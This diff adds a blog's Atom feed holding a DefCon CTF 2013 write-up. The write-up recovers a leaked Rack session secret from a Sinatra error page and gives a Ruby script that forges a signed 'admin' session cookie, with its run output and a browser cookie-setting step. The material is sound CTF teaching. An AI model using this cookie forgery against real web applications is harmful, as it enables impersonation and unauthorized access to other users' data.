@@ -1,0 +1,251 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+
+  <title><![CDATA[Category: web | xelz's blog]]></title>
+  <link href="http://xelz.info/blog/categories/web/atom.xml" rel="self"/>
+  <link href="http://xelz.info/"/>
+  <updated>2017-02-20T18:34:01+00:00</updated>
+  <id>http://xelz.info/</id>
+  <author>
+    <name><![CDATA[xelz]]></name>
+    
+  </author>
+  <generator uri="http://octopress.org/">Octopress</generator>
+
+  
+  <entry>
+    <title type="html"><![CDATA[DefCon CTF Qualifier 2013 3dub 3 Write Up]]></title>
+    <link href="http://xelz.info/blog/2013/06/28/defcon-ctf-qualifier-2013-3dub-3-write-up/"/>
+    <updated>2013-06-28T12:00:00+00:00</updated>
+    <id>http://xelz.info/blog/2013/06/28/defcon-ctf-qualifier-2013-3dub-3-write-up</id>
+    <content type="html"><![CDATA[<p>mirror of <a href="http://www.blue-lotus.net/def-con-ctf-qualifier-2013-3dub-3-writeup/">http://www.blue-lotus.net/def-con-ctf-qualifier-2013-3dub-3-writeup/</a></p>
+
+<p>First of all, we got a <code>secrets</code> link and <code>log in or create user</code> form. When we create and login, the website redirect us to the &lsquo;secrets&rsquo; page like this</p>
+
+<blockquote><p>Secrets</p>
+
+<p>name owner actions</p>
+
+<p>key admin <a href="#">show</a></p>
+
+<p>nothing asdf <a href="#">show</a></p>
+
+<p><a href="#">new secret</a></p></blockquote>
+
+<p>we&rsquo;ve got some links to see secrets owned by other users, include the <code>admin</code>, or easily add a new secret ourselves.</p>
+
+<p>Having a try to open the admin&rsquo;s secret, we got a 500 Error Page with some error stack, which powered by the Ruby framework <code>Sinatra</code>.</p>
+
+<p>From the very first sight of the page, it said <code>unauthorized</code> as the error message and a piece of source code was provided</p>
+
+<p>``` ruby</p>
+
+<pre><code>end
+
+redirect '/secrets'
+</code></pre>
+
+<p>end</p>
+
+<p>get &lsquo;/secrets/:id&rsquo; do</p>
+
+<pre><code>s = SECRETS[params[:id].to_i]
+</code></pre>
+
+<p>raise &ldquo;unauthorized&rdquo; if session[:user_name] != s.username</p>
+
+<p>haml :secret, locals: {secret: s}
+end</p>
+
+<p>helpers do</p>
+
+<pre><code>def current_user
+    return nil unless session[:user_name]
+</code></pre>
+
+<p>```</p>
+
+<!-- more -->
+
+
+<p>It meant that I&rsquo;m not the secret&rsquo;s holder. then have a look at the whole page, and you would find some environment variable in the <code>Rack ENV</code> section, partly like</p>
+
+<ul>
+<li>rack.session</li>
+</ul>
+
+
+<p><code>ruby
+{"session_id"=&gt;"353c66525a01fa0b3856cb9f34aae2aa9a36ad4cde02daea0ccfbaf566ddbb5a", "tracking"=&gt;{"HTTP_USER_AGENT"=&gt;"9c1f7f9f1bf9d50ec9176e6a805368e30e9d48bb", "HTTP_ACCEPT_ENCODING"=&gt;"ed2b3ca90a4e723402367a1d17c8b28392842398", "HTTP_ACCEPT_LANGUAGE"=&gt;"ca4aee0e81214addc5fb12877cf9e5c8b8beb7d6"}, "csrf"=&gt;"5f6d85b7e1b0a48c8a87e42803ac166cf7d60121afd24ba937bf65fa4f8989c6", "user_name"=&gt;"test"}
+</code></p>
+
+<ul>
+<li>rack.session.options</li>
+</ul>
+
+
+<p><code>ruby
+{:path=&gt;"/", :domain=&gt;nil, :expire_after=&gt;nil, :secure=&gt;false, :httponly=&gt;true, :defer=&gt;false, :renew=&gt;false, :sidbits=&gt;128, :secure_random=&gt;SecureRandom, :secret=&gt;"wroashsoxDiculReejLykUssyifabEdGhovHabno", :coder=&gt;#}
+</code></p>
+
+<ul>
+<li>rack.session.unpacked_cookie_data</li>
+</ul>
+
+
+<p><code>ruby
+{"session_id"=&gt;"353c66525a01fa0b3856cb9f34aae2aa9a36ad4cde02daea0ccfbaf566ddbb5a", "tracking"=&gt;{"HTTP_USER_AGENT"=&gt;"9c1f7f9f1bf9d50ec9176e6a805368e30e9d48bb", "HTTP_ACCEPT_ENCODING"=&gt;"ed2b3ca90a4e723402367a1d17c8b28392842398", "HTTP_ACCEPT_LANGUAGE"=&gt;"ca4aee0e81214addc5fb12877cf9e5c8b8beb7d6"}, "csrf"=&gt;"5f6d85b7e1b0a48c8a87e42803ac166cf7d60121afd24ba937bf65fa4f8989c6", "user_name"=&gt;"test"}
+</code></p>
+
+<ul>
+<li>rack.request.cookie_hash</li>
+</ul>
+
+
+<p><code>ruby
+{"rack.session"=&gt;"BAh7CUkiD3Nlc3Npb25faWQGOgZFRiJFMzUzYzY2NTI1YTAxZmEwYjM4NTZj\nYjlmMzRhYWUyYWE5YTM2YWQ0Y2RlMDJkYWVhMGNjZmJhZjU2NmRkYmI1YUki\nDXRyYWNraW5nBjsARnsISSIUSFRUUF9VU0VSX0FHRU5UBjsARiItOWMxZjdm\nOWYxYmY5ZDUwZWM5MTc2ZTZhODA1MzY4ZTMwZTlkNDhiYkkiGUhUVFBfQUND\nRVBUX0VOQ09ESU5HBjsARiItZWQyYjNjYTkwYTRlNzIzNDAyMzY3YTFkMTdj\nOGIyODM5Mjg0MjM5OEkiGUhUVFBfQUNDRVBUX0xBTkdVQUdFBjsARiItY2E0\nYWVlMGU4MTIxNGFkZGM1ZmIxMjg3N2NmOWU1YzhiOGJlYjdkNkkiCWNzcmYG\nOwBGIkU1ZjZkODViN2UxYjBhNDhjOGE4N2U0MjgwM2FjMTY2Y2Y3ZDYwMTIx\nYWZkMjRiYTkzN2JmNjVmYTRmODk4OWM2SSIOdXNlcl9uYW1lBjsARkkiCXRl\nc3QGOwBU\n--d637305e23d6693f3ebe276b292293c7ff0b72e6"}
+</code></p>
+
+<p>we&rsquo;ve got some message:</p>
+
+<p>the cookie <code>rack.session</code> is some way encoded of <code>rack.session.unpacked_cookie_data</code>, which is totally the same as env variable rack.session, and the coder mybe <code>Rack::Session::Cookie::Base64::Marshal</code>, secret (if any) maybe <code>wroashsoxDiculReejLykUssyifabEdGhovHabno</code></p>
+
+<p>By seeking the source code of rack, we found this <a href="https://github.com/rack/rack/blob/master/lib/rack/session/cookie.rb">https://github.com/rack/</a></p>
+
+<p>``` ruby</p>
+
+<pre><code>@secrets = options.values_at(:secret, :_old_secret).compact
+# some code else
+session_data = coder.encode(session)
+if @secrets.first
+    session_data &lt;&lt; "--#{generate_hmac(session_data, @secrets.first)}"
+end 
+# some code else
+def generate_hmac(data, secret)
+    OpenSSL::HMAC.hexdigest(OpenSSL::Digest::SHA1.new, secret, data)
+end
+</code></pre>
+
+<p>```</p>
+
+<p>Once the server received a request, it would confirm the validation of the cookie, reset the session if digest mismatch</p>
+
+<p>``` ruby
+if @secrets.size > 0 &amp;&amp; session_data</p>
+
+<pre><code>session_data, digest = session_data.split("--")
+session_data = nil unless digest_match?(session_data, digest)
+</code></pre>
+
+<p>end
+```</p>
+
+<p>Meanwhile, we knew the whole process of the session checking. thus, I&rsquo;ve wrote a ruby script to figure out this stuff with this way</p>
+
+<ul>
+<li><code>unpack(decode)</code> the cookie to origin session data</li>
+<li>modify session_data.user_name to <code>admin</code></li>
+<li><code>repack(encode)</code> the session data to cookie string format</li>
+<li>calculate a new digest of the session data then build the cookie</li>
+</ul>
+
+
+<h3>code</h3>
+
+<p>``` ruby</p>
+
+<h1>!/usr/bin/ruby</h1>
+
+<h1>Author: xelz@blue-lotus</h1>
+
+<p>require &lsquo;openssl&rsquo;</p>
+
+<h1>part of rack/lib/rack/session/cookie.rb</h1>
+
+<p>class Base64</p>
+
+<pre><code>def encode(str)
+    [str].pack('m')
+end
+
+def decode(str)
+    str.unpack('m').first
+end
+
+# Encode session cookies as Marshaled Base64 data
+class Marshal &lt; Base64
+    def encode(str)
+        super(::Marshal.dump(str))
+    end
+
+    def decode(str)
+        return unless str
+        ::Marshal.load(super(str)) rescue nil
+    end
+end
+</code></pre>
+
+<p>end</p>
+
+<p>def generate_hmac(data, secret)</p>
+
+<pre><code>OpenSSL::HMAC.hexdigest(OpenSSL::Digest::SHA1.new, secret, data)
+</code></pre>
+
+<p>end</p>
+
+<p>exit() unless ARGV[0]</p>
+
+<p>data = ARGV[0].split(&lsquo;&mdash;&rsquo;)[0]</p>
+
+<h1>puts &lsquo;data is:&rsquo;</h1>
+
+<h1>puts data, &ldquo;\n&rdquo;</h1>
+
+<p>coder = Base64::Marshal.new
+data = coder.decode(data)
+data[&lsquo;user_name&rsquo;] = &ldquo;admin&rdquo;
+data = coder.encode(data)</p>
+
+<h1>puts &lsquo;modified data is:&rsquo;</h1>
+
+<h1>puts data, &ldquo;\n&rdquo;</h1>
+
+<p>data = data</p>
+
+<p>secret = &lsquo;wroashsoxDiculReejLykUssyifabEdGhovHabno&rsquo;</p>
+
+<h1>puts &lsquo;new digest string is:&rsquo;</h1>
+
+<p>digest = generate_hmac(data, secret)</p>
+
+<h1>puts digest, &ldquo;\n&rdquo;</h1>
+
+<p>puts &lsquo;cookie is&rsquo;
+cookie = data.gsub(&ldquo;\n&rdquo;, &ldquo;%0A&rdquo;) + &lsquo;&mdash;&rsquo; + digest
+puts cookie
+```</p>
+
+<p>run the script like this:</p>
+
+<p><code>bash
+xelz@blue-lotus:defconctf$echo -en 'BAh7CUkiD3Nlc3Npb25faWQGOgZFRiJFMzUzYzY2NTI1YTAxZmEwYjM4NTZj\nYjlmMzRhYWUyYWE5YTM2YWQ0Y2RlMDJkYWVhMGNjZmJhZjU2NmRkYmI1YUki\nDXRyYWNraW5nBjsARnsISSIUSFRUUF9VU0VSX0FHRU5UBjsARiItOWMxZjdm\nOWYxYmY5ZDUwZWM5MTc2ZTZhODA1MzY4ZTMwZTlkNDhiYkkiGUhUVFBfQUND\nRVBUX0VOQ09ESU5HBjsARiItZWQyYjNjYTkwYTRlNzIzNDAyMzY3YTFkMTdj\nOGIyODM5Mjg0MjM5OEkiGUhUVFBfQUNDRVBUX0xBTkdVQUdFBjsARiItY2E0\nYWVlMGU4MTIxNGFkZGM1ZmIxMjg3N2NmOWU1YzhiOGJlYjdkNkkiCWNzcmYG\nOwBGIkU1ZjZkODViN2UxYjBhNDhjOGE4N2U0MjgwM2FjMTY2Y2Y3ZDYwMTIx\nYWZkMjRiYTkzN2JmNjVmYTRmODk4OWM2SSIOdXNlcl9uYW1lBjsARkkiCXRl\nc3QGOwBU\n' | awk '{print $1"\\"}' | xargs ./hypeman.rb
+cookie is
+BAh7CSINdHJhY2tpbmd7CCIZSFRUUF9BQ0NFUFRfRU5DT0RJTkciLWVkMmIz%0AY2E5MGE0ZTcyMzQwMjM2N2ExZDE3YzhiMjgzOTI4NDIzOTgiFEhUVFBfVVNF%0AUl9BR0VOVCItOWMxZjdmOWYxYmY5ZDUwZWM5MTc2ZTZhODA1MzY4ZTMwZTlk%0ANDhiYiIZSFRUUF9BQ0NFUFRfTEFOR1VBR0UiLWNhNGFlZTBlODEyMTRhZGRj%0ANWZiMTI4NzdjZjllNWM4YjhiZWI3ZDYiCWNzcmYiRTVmNmQ4NWI3ZTFiMGE0%0AOGM4YTg3ZTQyODAzYWMxNjZjZjdkNjAxMjFhZmQyNGJhOTM3YmY2NWZhNGY4%0AOTg5YzYiD3Nlc3Npb25faWQiRTM1M2M2NjUyNWEwMWZhMGIzODU2Y2I5ZjM0%0AYWFlMmFhOWEzNmFkNGNkZTAyZGFlYTBjY2ZiYWY1NjZkZGJiNWEiDnVzZXJf%0AbmFtZSIKYWRtaW4=%0A--4bd0a545e155460f804aff9df3e80e20fdffa07f
+</code></p>
+
+<p>then modify the cookie with the new value, using any tool you like such as Firebug(for Firefox), WebInspector(for Webkit Based Browser), Fiddler(under IE7), Burpsuite(Java Based for any platform), I&rsquo;d like to use the Javascript Console in Chrome:</p>
+
+<p><code>javascript
+document.cookie='rack.session=xxx;'
+</code></p>
+
+<p>refresh the page, and enjoy :)</p>
+
+<h3>key</h3>
+
+<blockquote><p>watch out for this Etdeksogav</p></blockquote>
+]]></content>
+  </entry>
+  
+</feed>
